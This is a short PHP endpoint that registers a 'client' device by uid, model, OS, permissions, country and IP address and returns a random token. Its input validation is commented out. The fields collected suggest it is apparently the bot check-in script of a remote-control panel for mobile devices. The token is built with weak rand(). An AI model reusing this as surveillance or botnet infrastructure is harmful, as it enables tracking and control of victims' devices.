<?php
	require_once realpath(dirname(__FILE__)) . '/../utils/db.php';
	
	/*if(empty($_GET["uid"])) {
		echo "1";
		return;
	}
	
	if(empty($_GET["model"])) {
		echo "2";
		return;
	}
	
	if(empty($_GET["os"])) {
		echo "";
		return;
	}
	
	if(empty($_GET["permissions"])) {
		echo "";
		return;
	}
	
	if(empty($_GET["country"])) {
		echo "";
		return;
	}*/
	
	if(!empty(get_client($_GET["uid"])[0])) {
		echo "";
		return;
	}
	
	$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ=-{}[];\"_';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < 255; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
	
	$randomString = hash("sha256", $randomString);
	
	add_client(
		htmlspecialchars($_GET["uid"], ENT_QUOTES, 'UTF-8'),
		htmlspecialchars($_GET["country"], ENT_QUOTES, 'UTF-8'),
		htmlspecialchars($_GET["model"], ENT_QUOTES, 'UTF-8'),
		htmlspecialchars($_GET["os"], ENT_QUOTES, 'UTF-8'),
		htmlspecialchars($_GET["permissions"], ENT_QUOTES, 'UTF-8'),
		$_SERVER["REMOTE_ADDR"],
		$randomString
	);
	
	echo $randomString
	
?>